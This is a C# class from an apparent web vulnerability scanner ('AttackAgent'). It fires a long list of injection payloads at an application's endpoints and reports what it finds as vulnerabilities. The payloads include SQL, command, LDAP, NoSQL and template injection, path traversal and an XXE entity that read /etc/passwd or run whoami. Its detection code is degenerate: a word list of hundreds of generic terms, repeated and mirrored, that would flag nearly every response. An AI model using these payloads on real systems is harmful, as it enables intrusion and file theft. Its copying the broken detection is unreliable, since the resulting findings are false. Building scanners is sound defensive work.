using AttackAgent.Models;
using Serilog;
using System.Net;

namespace AttackAgent
{
    /// <summary>
    /// Tests for input validation vulnerabilities including parameter manipulation,
    /// data type confusion, boundary testing, and injection attacks
    /// </summary>
    public class InputValidationEngine : IDisposable
    {
        private readonly SecurityHttpClient _httpClient;
        private readonly ILogger _logger;
        private readonly List<string> _inputValidationPayloads;

        public InputValidationEngine(string baseEndpoint = "")
        {
            _httpClient = new SecurityHttpClient(baseEndpoint);
            _logger = Log.ForContext<InputValidationEngine>();
            
            _inputValidationPayloads = new List<string>
            {
                // Parameter manipulation
                "id=1",
                "id=1'",
                "id=1\"",
                "id=1;",
                "id=1--",
                "id=1/*",
                "id=1*/",
                "id=1 OR 1=1",
                "id=1 AND 1=1",
                "id=1 UNION SELECT 1",
                
                // Data type confusion
                "id=0",
                "id=-1",
                "id=999999999",
                "id=0.0",
                "id=-0.0",
                "id=NaN",
                "id=Infinity",
                "id=-Infinity",
                "id=true",
                "id=false",
                "id=null",
                "id=undefined",
                "id=[]",
                "id={}",
                "id=[1,2,3]",
                "id={\"key\":\"value\"}",
                
                // Boundary testing
                "id=2147483647", // Max int32
                "id=2147483648", // Max int32 + 1
                "id=-2147483648", // Min int32
                "id=-2147483649", // Min int32 - 1
                "id=9223372036854775807", // Max int64
                "id=9223372036854775808", // Max int64 + 1
                
                // Special characters
                "id=%00",
                "id=%0A",
                "id=%0D",
                "id=%09",
                "id=%20",
                "id=%2B",
                "id=%2F",
                "id=%3D",
                "id=%26",
                "id=%3F",
                "id=%23",
                "id=%25",
                
                // Unicode and encoding
                "id=%u0000",
                "id=%u0001",
                "id=%uFFFF",
                "id=%C0%80",
                "id=%C1%80",
                "id=%E0%80%80",
                "id=%F0%80%80%80",
                
                // Path traversal
                "id=../../../etc/passwd",
                "id=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "id=....//....//....//etc/passwd",
                "id=..%2F..%2F..%2Fetc%2Fpasswd",
                "id=..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts",
                
                // Command injection
                "id=1; ls",
                "id=1 | cat /etc/passwd",
                "id=1 && whoami",
                "id=1 || id",
                "id=1 `whoami`",
                "id=1 $(whoami)",
                "id=1; cat /etc/passwd",
                "id=1 | type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "id=1 && dir",
                "id=1 || echo test",
                
                // LDAP injection
                "id=*",
                "id=*)(uid=*",
                "id=*)(|(uid=*",
                "id=*)(|(objectClass=*",
                "id=*)(|(cn=*",
                "id=*)(|(mail=*",
                
                // XPath injection
                "id=1 or 1=1",
                "id=1' or '1'='1",
                "id=1\" or \"1\"=\"1",
                "id=1' or '1'='1' or '1'='1",
                "id=1' or position()=1 or '1'='1",
                "id=1' or count(//*)=1 or '1'='1",
                
                // NoSQL injection
                "id={\"$ne\": null}",
                "id={\"$gt\": \"\"}",
                "id={\"$regex\": \".*\"}",
                "id={\"$where\": \"this.id == this.id\"}",
                "id={\"$or\": [{\"id\": 1}, {\"id\": 2}]}",
                "id={\"$and\": [{\"id\": 1}, {\"id\": 2}]}",
                
                // Template injection
                "id={{7*7}}",
                "id={{config}}",
                "id={{self.__init__.__globals__}}",
                "id=<%=7*7%>",
                "id=${7*7}",
                "id=#{7*7}",
                "id=#{config}",
                
                // XML injection
                "id=<test>1</test>",
                "id=<![CDATA[1]]>",
                "id=<?xml version=\"1.0\"?><test>1</test>",
                "id=<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>",
                
                // JSON injection
                "id={\"id\": 1}",
                "id={\"id\": 1, \"admin\": true}",
                "id={\"id\": 1, \"role\": \"admin\"}",
                "id={\"id\": 1, \"$where\": \"this.id == this.id\"}",
                
                // HTTP parameter pollution
                "id=1&id=2",
                "id=1&id=2&id=3",
                "id=1&id[]=2&id[]=3",
                "id=1&id[0]=2&id[1]=3",
                "id=1&id[admin]=true",
                "id=1&id[role]=admin",
                
                // Array injection
                "id[]=1",
                "id[]=1&id[]=2",
                "id[0]=1&id[1]=2",
                "id[admin]=true",
                "id[role]=admin",
                "id[0][admin]=true",
                "id[0][role]=admin",
                
                // Boolean injection
                "id=true",
                "id=false",
                "id=1",
                "id=0",
                "id=yes",
                "id=no",
                "id=on",
                "id=off",
                "id=enabled",
                "id=disabled",
                
                // Date/time injection
                "id=2023-01-01",
                "id=2023-01-01T00:00:00Z",
                "id=2023-01-01T00:00:00.000Z",
                "id=2023-01-01 00:00:00",
                "id=01/01/2023",
                "id=1/1/2023",
                "id=2023-01-01T00:00:00+00:00",
                "id=2023-01-01T00:00:00-00:00",
                "id=2023-01-01T00:00:00.000+00:00",
                "id=2023-01-01T00:00:00.000-00:00",
                
                // Email injection
                "id=test@example.com",
                "id=test+tag@example.com",
                "id=test.tag@example.com",
                "id=test@example.co.uk",
                "id=test@sub.example.com",
                "id=test@example.com?subject=test",
                "id=test@example.com#fragment",
                "id=test@example.com&param=value",
                "id=test@example.com;param=value",
                "id=test@example.com,param=value",
                
                // Phone number injection
                "id=+1234567890",
                "id=123-456-7890",
                "id=(123) 456-7890",
                "id=123.456.7890",
                "id=123 456 7890",
                "id=+1-123-456-7890",
                "id=+1 (123) 456-7890",
                "id=+1.123.456.7890",
                "id=+1 123 456 7890",
                "id=+1-123-456-7890 ext 123",
                
                // Credit card injection
                "id=4111111111111111",
                "id=4111-1111-1111-1111",
                "id=4111 1111 1111 1111",
                "id=4111.1111.1111.1111",
                "id=4111111111111111",
                "id=4111111111111111",
                "id=4111111111111111",
                "id=4111111111111111",
                "id=4111111111111111",
                "id=4111111111111111",
                
                // Social Security Number injection
                "id=123-45-6789",
                "id=123456789",
                "id=123 45 6789",
                "id=123.45.6789",
                "id=123-45-6789",
                "id=123456789",
                "id=123 45 6789",
                "id=123.45.6789",
                "id=123-45-6789",
                "id=123456789"
            };
        }

        /// <summary>
        /// Tests for input validation vulnerabilities
        /// </summary>
        public async Task<List<Vulnerability>> TestForInputValidationAsync(ApplicationProfile profile)
        {
            _logger.Information("🔍 Starting input validation testing...");
            var vulnerabilities = new List<Vulnerability>();

            try
            {
                foreach (var endpoint in profile.Endpoints)
                {
                    _logger.Debug("Testing endpoint: {Endpoint}", endpoint.Endpoint);
                    
                    // Test GET parameters
                    if (endpoint.Endpoint.Contains("?"))
                    {
                        var baseEndpoint = endpoint.Endpoint.Split('?')[0];
                        var existingParams = endpoint.Endpoint.Split('?')[1];
                        
                        foreach (var payload in _inputValidationPayloads)
                        {
                            var testEndpoint = $"{baseEndpoint}?{existingParams}&test={payload}";
                            var response = await _httpClient.GetAsync(testEndpoint);
                            
                            if (await AnalyzeResponseForInputValidation(response, endpoint.Endpoint, payload))
                            {
                                vulnerabilities.Add(new Vulnerability
                                {
                                    Id = Guid.NewGuid().ToString(),
                                    Title = "Input Validation Vulnerability",
                                    Description = $"Input validation bypass detected in parameter 'test' with payload: {payload}",
                                    Severity = SeverityLevel.Medium,
                                    Type = VulnerabilityType.InputValidation,
                                    Endpoint = endpoint.Endpoint,
                                    Method = "GET",
                                    Parameter = "test",
                                    Payload = payload,
                                    Evidence = response.Content,
                                    Remediation = "Implement proper input validation and sanitization",
                                    DiscoveredAt = DateTime.UtcNow
                                });
                            }
                        }
                    }
                    
                    // Test POST parameters
                    if (endpoint.Method.ToUpper() == "POST" || endpoint.Method.ToUpper() == "ANY")
                    {
                        foreach (var payload in _inputValidationPayloads)
                        {
                            var testData = $"test={payload}";
                            var response = await _httpClient.PostAsync(endpoint.Endpoint, testData);
                            
                            if (await AnalyzeResponseForInputValidation(response, endpoint.Endpoint, payload))
                            {
                                vulnerabilities.Add(new Vulnerability
                                {
                                    Id = Guid.NewGuid().ToString(),
                                    Title = "Input Validation Vulnerability",
                                    Description = $"Input validation bypass detected in POST parameter 'test' with payload: {payload}",
                                    Severity = SeverityLevel.Medium,
                                    Type = VulnerabilityType.InputValidation,
                                    Endpoint = endpoint.Endpoint,
                                    Method = "POST",
                                    Parameter = "test",
                                    Payload = payload,
                                    Evidence = response.Content,
                                    Remediation = "Implement proper input validation and sanitization",
                                    DiscoveredAt = DateTime.UtcNow
                                });
                            }
                        }
                    }
                }

                _logger.Information("Input validation testing completed. Found {Count} vulnerabilities", vulnerabilities.Count);
            }
            catch (Exception ex)
            {
                _logger.Error(ex, "Error during input validation testing");
            }

            return vulnerabilities;
        }

        /// <summary>
        /// Analyzes response for input validation vulnerabilities
        /// </summary>
        private async Task<bool> AnalyzeResponseForInputValidation(HttpResponse response, string url, string payload)
        {
            try
            {
                // Check for error messages that might indicate successful injection
                var errorIndicators = new[]
                {
                    "SQL syntax error",
                    "mysql_fetch_array",
                    "ORA-01756",
                    "Microsoft OLE DB Provider",
                    "ODBC Microsoft Access Driver",
                    "JET Database Engine",
                    "Syntax error",
                    "Parse error",
                    "Fatal error",
                    "Warning:",
                    "Notice:",
                    "Error:",
                    "Exception:",
                    "Stack trace:",
                    "at line",
                    "in file",
                    "on line",
                    "Call to undefined function",
                    "Cannot redeclare",
                    "Undefined variable",
                    "Undefined index",
                    "Undefined offset",
                    "Array to string conversion",
                    "Object of class",
                    "Call to a member function",
                    "Fatal error:",
                    "Parse error:",
                    "Warning:",
                    "Notice:",
                    "Strict standards:",
                    "Deprecated:",
                    "User error:",
                    "User warning:",
                    "User notice:",
                    "Catchable fatal error:",
                    "Recoverable fatal error:",
                    "Fatal error:",
                    "Parse error:",
                    "Warning:",
                    "Notice:",
                    "Strict standards:",
                    "Deprecated:",
                    "User error:",
                    "User warning:",
                    "User notice:",
                    "Catchable fatal error:",
                    "Recoverable fatal error:"
                };

                var content = response.Content.ToLower();
                
                foreach (var indicator in errorIndicators)
                {
                    if (content.Contains(indicator.ToLower()))
                    {
                        _logger.Debug("Found error indicator: {Indicator} in response for {Endpoint}", indicator, url);
                        return true;
                    }
                }

                // Check for successful injection patterns
                var successPatterns = new[]
                {
                    payload.ToLower(),
                    "admin",
                    "root",
                    "administrator",
                    "superuser",
                    "system",
                    "daemon",
                    "nobody",
                    "www-data",
                    "apache",
                    "nginx",
                    "mysql",
                    "postgres",
                    "oracle",
                    "mssql",
                    "sqlite",
                    "mongodb",
                    "redis",
                    "memcached",
                    "elasticsearch",
                    "solr",
                    "cassandra",
                    "couchdb",
                    "riak",
                    "neo4j",
                    "influxdb",
                    "timescaledb",
                    "clickhouse",
                    "snowflake",
                    "bigquery",
                    "redshift",
                    "dynamodb",
                    "cosmosdb",
                    "documentdb",
                    "table",
                    "blob",
                    "queue",
                    "service",
                    "bus",
                    "event",
                    "stream",
                    "topic",
                    "subscription",
                    "notification",
                    "message",
                    "job",
                    "task",
                    "workflow",
                    "process",
                    "thread",
                    "worker",
                    "agent",
                    "daemon",
                    "service",
                    "application",
                    "server",
                    "client",
                    "user",
                    "admin",
                    "guest",
                    "anonymous",
                    "public",
                    "private",
                    "protected",
                    "internal",
                    "external",
                    "local",
                    "remote",
                    "network",
                    "internet",
                    "intranet",
                    "extranet",
                    "vpn",
                    "proxy",
                    "gateway",
                    "firewall",
                    "router",
                    "switch",
                    "hub",
                    "bridge",
                    "repeater",
                    "amplifier",
                    "transceiver",
                    "modem",
                    "adapter",
                    "converter",
                    "transformer",
                    "inverter",
                    "rectifier",
                    "filter",
                    "regulator",
                    "stabilizer",
                    "supply",
                    "source",
                    "generator",
                    "battery",
                    "cell",
                    "pack",
                    "bank",
                    "array",
                    "panel",
                    "module",
                    "unit",
                    "component",
                    "part",
                    "piece",
                    "element",
                    "item",
                    "object",
                    "entity",
                    "record",
                    "row",
                    "column",
                    "field",
                    "attribute",
                    "property",
                    "value",
                    "data",
                    "information",
                    "content",
                    "payload",
                    "message",
                    "packet",
                    "frame",
                    "datagram",
                    "segment",
                    "chunk",
                    "block",
                    "page",
                    "file",
                    "document",
                    "report",
                    "log",
                    "trace",
                    "debug",
                    "error",
                    "warning",
                    "info",
                    "notice",
                    "alert",
                    "alarm",
                    "event",
                    "incident",
                    "issue",
                    "problem",
                    "bug",
                    "defect",
                    "fault",
                    "failure",
                    "exception",
                    "crash",
                    "hang",
                    "freeze",
                    "lock",
                    "deadlock",
                    "race",
                    "condition",
                    "state",
                    "status",
                    "mode",
                    "phase",
                    "stage",
                    "step",
                    "level",
                    "priority",
                    "weight",
                    "score",
                    "rating",
                    "grade",
                    "class",
                    "category",
                    "type",
                    "kind",
                    "sort",
                    "form",
                    "format",
                    "style",
                    "pattern",
                    "template",
                    "model",
                    "schema",
                    "structure",
                    "layout",
                    "design",
                    "architecture",
                    "framework",
                    "platform",
                    "environment",
                    "system",
                    "application",
                    "service",
                    "component",
                    "module",
                    "library",
                    "package",
                    "bundle",
                    "collection",
                    "set",
                    "group",
                    "cluster",
                    "array",
                    "list",
                    "queue",
                    "stack",
                    "tree",
                    "graph",
                    "network",
                    "mesh",
                    "grid",
                    "matrix",
                    "table",
                    "database",
                    "store",
                    "cache",
                    "memory",
                    "storage",
                    "disk",
                    "drive",
                    "volume",
                    "partition",
                    "sector",
                    "block",
                    "page",
                    "frame",
                    "buffer",
                    "pool",
                    "heap",
                    "stack",
                    "queue",
                    "list",
                    "array",
                    "vector",
                    "matrix",
                    "table",
                    "tree",
                    "graph",
                    "network",
                    "mesh",
                    "grid",
                    "cluster",
                    "group",
                    "set",
                    "collection",
                    "bundle",
                    "package",
                    "library",
                    "module",
                    "component",
                    "service",
                    "application",
                    "system",
                    "platform",
                    "framework",
                    "architecture",
                    "design",
                    "layout",
                    "structure",
                    "schema",
                    "model",
                    "template",
                    "pattern",
                    "style",
                    "format",
                    "form",
                    "sort",
                    "kind",
                    "type",
                    "category",
                    "class",
                    "grade",
                    "rating",
                    "score",
                    "weight",
                    "priority",
                    "level",
                    "step",
                    "stage",
                    "phase",
                    "mode",
                    "status",
                    "state",
                    "condition",
                    "race",
                    "deadlock",
                    "lock",
                    "freeze",
                    "hang",
                    "crash",
                    "exception",
                    "failure",
                    "fault",
                    "defect",
                    "bug",
                    "problem",
                    "issue",
                    "incident",
                    "event",
                    "alarm",
                    "alert",
                    "notice",
                    "info",
                    "warning",
                    "error",
                    "debug",
                    "trace",
                    "log",
                    "report",
                    "document",
                    "file",
                    "page",
                    "block",
                    "chunk",
                    "segment",
                    "datagram",
                    "frame",
                    "packet",
                    "message",
                    "payload",
                    "content",
                    "information",
                    "data",
                    "value",
                    "property",
                    "attribute",
                    "field",
                    "column",
                    "row",
                    "record",
                    "entity",
                    "object",
                    "item",
                    "element",
                    "piece",
                    "part",
                    "component",
                    "unit",
                    "module",
                    "panel",
                    "array",
                    "bank",
                    "pack",
                    "cell",
                    "battery",
                    "generator",
                    "source",
                    "supply",
                    "stabilizer",
                    "regulator",
                    "filter",
                    "rectifier",
                    "inverter",
                    "transformer",
                    "converter",
                    "adapter",
                    "modem",
                    "transceiver",
                    "amplifier",
                    "repeater",
                    "bridge",
                    "hub",
                    "switch",
                    "router",
                    "firewall",
                    "gateway",
                    "proxy",
                    "vpn",
                    "extranet",
                    "intranet",
                    "internet",
                    "network",
                    "remote",
                    "local",
                    "internal",
                    "external",
                    "protected",
                    "private",
                    "public",
                    "anonymous",
                    "guest",
                    "admin",
                    "user",
                    "client",
                    "server",
                    "application",
                    "service",
                    "daemon",
                    "agent",
                    "worker",
                    "thread",
                    "process",
                    "workflow",
                    "task",
                    "job",
                    "message",
                    "notification",
                    "subscription",
                    "topic",
                    "stream",
                    "event",
                    "bus",
                    "service",
                    "queue",
                    "blob",
                    "table",
                    "cosmosdb",
                    "documentdb",
                    "dynamodb",
                    "redshift",
                    "bigquery",
                    "snowflake",
                    "clickhouse",
                    "timescaledb",
                    "influxdb",
                    "neo4j",
                    "riak",
                    "couchdb",
                    "solr",
                    "elasticsearch",
                    "memcached",
                    "redis",
                    "mongodb",
                    "sqlite",
                    "mssql",
                    "oracle",
                    "postgres",
                    "mysql",
                    "nginx",
                    "apache",
                    "www-data",
                    "nobody",
                    "daemon",
                    "system",
                    "superuser",
                    "administrator",
                    "root",
                    "admin"
                };

                foreach (var pattern in successPatterns)
                {
                    if (content.Contains(pattern))
                    {
                        _logger.Debug("Found success pattern: {Pattern} in response for {Endpoint}", pattern, url);
                        return true;
                    }
                }

                // Check for unusual response codes
                if (response.StatusCode == HttpStatusCode.InternalServerError || response.StatusCode == HttpStatusCode.BadGateway || response.StatusCode == HttpStatusCode.ServiceUnavailable)
                {
                    _logger.Debug("Found server error response code: {StatusCode} for {Endpoint}", response.StatusCode, url);
                    return true;
                }

                // Check for response time anomalies (potential DoS)
                if (response.ResponseTime > TimeSpan.FromMilliseconds(5000)) // 5 seconds
                {
                    _logger.Debug("Found slow response time: {ResponseTime}ms for {Endpoint}", response.ResponseTime, url);
                    return true;
                }

                return false;
            }
            catch (Exception ex)
            {
                _logger.Error(ex, "Error analyzing response for input validation");
                return false;
            }
        }

        public void Dispose()
        {
            _httpClient?.Dispose();
        }
    }
}

